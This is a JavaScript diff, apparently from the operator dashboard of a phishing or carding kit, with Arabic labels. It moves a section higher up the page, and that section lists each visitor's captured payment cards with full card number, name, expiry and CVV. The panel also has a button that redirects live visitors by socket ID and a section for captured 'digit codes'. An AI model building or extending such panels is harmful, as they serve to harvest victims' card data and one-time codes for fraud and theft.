@@ -510,6 +510,24 @@
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
 
+      // Payment Cards (shown first - newest data)
+      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
+        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
+        html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>';
+        html += '<div class="space-y-3">';
+        visitor.paymentCards.forEach((card, i) => {
+          html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
+          html += '<p class="font-medium mb-2 text-purple-700">بطاقة ' + (i + 1) + '</p>';
+          html += '<div class="grid grid-cols-2 gap-3 text-sm">';
+          html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
+          html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
+          html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+          html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
+          html += '</div></div>';
+        });
+        html += '</div></div>';
+      }
+
       // Display data history in reverse order (newest first)
       if (visitor.dataHistory && visitor.dataHistory.length > 0) {
         const reversedHistory = [...visitor.dataHistory].reverse();
@@ -582,24 +600,6 @@
           });
           html += '</div></div>';
         }
-      }
-
-      // Payment Cards
-      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
-        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
-        html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>';
-        html += '<div class="space-y-3">';
-        visitor.paymentCards.forEach((card, i) => {
-          html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-          html += '<p class="font-medium mb-2 text-purple-700">بطاقة ' + (i + 1) + '</p>';
-          html += '<div class="grid grid-cols-2 gap-3 text-sm">';
-          html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
-          html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
-          html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-          html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
-          html += '</div></div>';
-        });
-        html += '</div></div>';
       }
 
       // Digit Codes
